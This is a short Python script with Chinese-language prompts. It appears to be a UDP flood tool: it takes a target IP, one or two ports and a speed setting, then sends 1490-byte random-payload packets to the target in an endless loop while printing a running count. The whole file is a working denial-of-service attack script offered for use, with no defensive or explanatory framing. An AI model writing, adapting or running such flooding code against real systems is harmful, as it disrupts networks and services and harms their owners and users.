import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

port_two = input('双端口[Y/N]?')

try:
     ip = input("IP:")
     port = int(input("PORT:"))
     if port_two == 'Y' or port_two == 'y':
         port_ = int(input('PORT 2:'))
     else:
         pass
     vel = int(input("velocity(1~1000):"))
except Exception as e:
     print(e)
     print('stop')
     pass

sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     if port_two == 'Y' or port_two == 'y':
         sock.sendto(bytes, (ip, port_))
     else:
         pass
     sent = sent + 1
     print ("已发送数据包 %s 个到 %s 端口 %d"%(sent,ip,port))
     if port_two == 'Y' or port_two == 'y':
         print ("已发送数据包 %s 个到 %s 端口[2] %d"%(sent,ip,port_))
     else:
         pass
     time.sleep((1000-vel)/2000)